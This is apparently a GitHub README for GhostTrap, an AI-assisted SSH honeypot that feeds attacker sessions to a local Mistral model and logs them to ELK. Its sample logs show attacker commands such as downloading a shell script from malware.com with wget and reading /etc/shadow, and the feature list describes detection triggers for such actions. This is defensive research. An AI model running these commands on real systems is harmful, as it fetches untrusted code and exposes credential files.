# GhostTrap
**AI-Powered High-Interaction Honeypot Network**

> "They see a door. We see a trap."

![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=flat&logo=python&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?style=flat&logo=docker&logoColor=white)
![Ollama](https://img.shields.io/badge/AI-Mistral%207B-8A2BE2?style=flat)
![ELK](https://img.shields.io/badge/ELK-8.x-005571?style=flat&logo=elastic&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-green?style=flat)
![Status](https://img.shields.io/badge/Status-Active%20Development-orange?style=flat)

---

## Overview

GhostTrap is a multi-VM honeypot network powered by a local AI engine. Instead of simply logging connection attempts, GhostTrap lets attackers inside a fully convincing fake environment and silently records everything they do.

The AI engine (Mistral 7B running locally via Ollama) generates realistic terminal responses to any command the attacker types, keeping them engaged and unaware they are being observed. All activity is captured as structured JSON, shipped to Elasticsearch via Filebeat, and visualized in Kibana.

This is an active research project built from scratch with no frameworks or tutorials.

---

## How It Works

A typical honeypot tells you someone knocked on the door. GhostTrap opens the door.

```
Attacker scans target
         |
         v
Port 22 open — looks like real Ubuntu SSH
         |
         v
Login attempts captured (username + password logged)
         |
         v
Denied twice. Allowed on third attempt.
         |
         v
Attacker lands in a fake Ubuntu shell
         |
    .----+----.
    |         |
Known cmd   Unknown cmd
    |         |
Local reply  Sent to Mistral AI
    |         | (generates realistic output)
    '----+----'
         |
         v
Everything logged -> Filebeat -> Logstash -> Elasticsearch -> Kibana
```

The attacker believes they have compromised a real machine. They keep going. They reveal their tools, their techniques, and their objectives — all captured.

---

## Current Status

| Phase | Description | Status |
|-------|-------------|--------|
| 1 | Multi-VM lab network (VirtualBox) | Complete |
| 1 | ELK Stack via Docker | Complete |
| 1 | Filebeat log pipeline | Complete |
| 2 | SSH Honeypot — fake server, fake shell, fake filesystem | Complete |
| 2 | Credential capture (all login attempts) | Complete |
| 2 | Malware download detection (wget/curl alerts) | Complete |
| 2 | Sensitive file access alerts | Complete |
| 2 | Full session logging with command history | Complete |
| 3 | Ollama + Mistral 7B running locally | Complete |
| 3 | AI Bridge (Flask API) | Complete |
| 3 | Full AI integration into SSH session | In Progress |
| 4 | HTTP Honeypot | Planned |
| 4 | MySQL Honeypot | Planned |
| 4 | RDP + SMB Honeypot (Windows VM) | Planned |
| 5 | Custom React dashboard | Planned |
| 5 | Cross-VM attack correlation | Planned |
| 5 | Automated threat reports | Planned |

---

## Architecture

```
                         ATTACKER
                            |
           .----------------+----------------.
           |                |                |
      Ubuntu VM        Linux VM        Windows VM
     192.168.56.3    192.168.56.5      192.168.56.x
      SSH  : 22        MySQL : 3306     RDP : 3389
      HTTP : 80        FTP   : 21       SMB : 445
           |                |                |
       Filebeat         Filebeat         Filebeat
           '----------------+----------------'
                            |
                      Kali Host
                    192.168.56.1
                            |
              .-------------+-------------.
              |             |             |
          Logstash   Elasticsearch    Kibana
           :5044        :9200          :5601
                            |
                       AI Bridge
                         :5000
                            |
                   Ollama + Mistral 7B
                         :11434
```

Network: All VMs run on an isolated VirtualBox host-only network (192.168.56.0/24). They cannot reach the real home network. The Kali host bridges both.

---

## Features

**SSH Honeypot**
- Presents a real-looking SSH banner (OpenSSH_8.9p1 Ubuntu)
- Intentionally fails login twice, then grants access on the third attempt
- Drops attacker into a fake Ubuntu shell with realistic prompt
- Fake filesystem includes /etc/passwd, /etc/shadow, .ssh/id_rsa, wp-config.php, .bash_history, and more
- Every command logged with timestamp, working directory, and session context
- Immediate alerts for wget/curl attempts (malware downloads)
- Immediate alerts for sensitive file reads

**AI Engine**
- Mistral 7B runs entirely offline via Ollama — no API keys, no cost
- AI Bridge is a lightweight Flask API connecting the honeypot to the model
- Unknown commands are sent to the AI, which responds as a real Linux terminal
- Response cleaning strips markdown artifacts before sending to attacker

**Log Pipeline**
- Loguru handles structured JSON logging on each VM
- Filebeat ships logs to Logstash on the Kali host
- Logstash parses and enriches events
- Elasticsearch stores all data
- Kibana provides real-time attack visualization

---

## Sample Log Output

SSH login attempt:
```json
{
  "timestamp": "2026-03-11T12:07:46",
  "event": "ssh_login_attempt",
  "src_ip": "192.168.56.5",
  "username": "root",
  "password": "admin123",
  "attempt": 2,
  "honeypot": "ssh",
  "vm": "ubuntu"
}
```

Malware download attempt:
```json
{
  "timestamp": "2026-03-11T12:09:33",
  "event": "malware_download_attempt",
  "src_ip": "192.168.56.5",
  "url": "http://malware.com/shell.sh",
  "threat_level": "CRITICAL",
  "honeypot": "ssh",
  "vm": "ubuntu"
}
```

Session summary:
```json
{
  "timestamp": "2026-03-11T12:20:00",
  "event": "session_ended",
  "src_ip": "192.168.56.5",
  "duration": "0:12:34",
  "total_commands": 23,
  "commands": [
    { "command": "whoami",                        "cwd": "/root" },
    { "command": "cat /etc/shadow",               "cwd": "/root" },
    { "command": "cat /root/notes.txt",           "cwd": "/root" },
    { "command": "wget http://malware.com/sh.sh", "cwd": "/root" }
  ]
}
```

---

## Tech Stack

| Layer | Technology |
|-------|-----------|
| SSH Honeypot | Python, Paramiko |
| AI Model | Mistral 7B via Ollama |
| AI Bridge | Python, Flask |
| Logging | Loguru |
| Log Shipping | Filebeat 8.x |
| Log Processing | Logstash |
| Storage | Elasticsearch 8.x |
| Visualization | Kibana 8.x |
| Containers | Docker, Docker Compose |
| Virtualization | VirtualBox |
| Host OS | Kali Linux |

---

## Lab Environment

```
Host Machine: Kali Linux
  RAM:  32GB
  CPU:  8 cores
  IPs:  192.168.31.212 (internet)
        192.168.56.1   (VM bridge)

Virtual Machines:
  Ubuntu VM  — 192.168.56.3  — SSH Honeypot (live)
  Linux VM   — 192.168.56.5  — MySQL Honeypot (in progress)
  Windows VM — 192.168.56.x  — RDP/SMB Honeypot (planned)
```

---

## Getting Started

Requirements: Python 3.10+, Docker, VirtualBox, 16GB+ RAM

```bash
# Clone the repository
git clone https://github.com/YOURUSERNAME/GhostTrap.git
cd GhostTrap

# Install dependencies
pip3 install -r requirements.txt

# Start ELK Stack
docker-compose up -d

# Pull AI model
ollama pull mistral

# Start AI Bridge on host
python3 ai/ai_bridge.py

# On Ubuntu VM — generate SSH key and start honeypot
ssh-keygen -t rsa -b 2048 -f /opt/ghosttrap/server.key -N ""
sudo python3 honeypots/ssh_honeypot.py
```

Full setup instructions: docs/INSTALL.md

---

## Repository Structure

```
GhostTrap/
├── honeypots/
│   ├── ssh_honeypot.py       # AI SSH honeypot (complete)
│   ├── http_honeypot.py      # Coming soon
│   └── mysql_honeypot.py     # Coming soon
├── ai/
│   └── ai_bridge.py          # Flask API connecting honeypot to Ollama
├── filebeat/
│   └── filebeat.yml          # Filebeat config for log shipping
├── docs/
│   ├── INSTALL.md            # Full installation guide
│   └── ARCHITECTURE.md       # Detailed system design
├── scripts/
│   └── setup.sh              # Host setup script
├── docker-compose.yml        # ELK Stack
├── logstash.conf             # Log pipeline config
└── requirements.txt
```

---

## Disclaimer

This project is intended for educational purposes and defensive security research only. Deploy only on infrastructure you own or have explicit written permission to test. The author assumes no responsibility for misuse.

---

## License

MIT — see LICENSE for details.
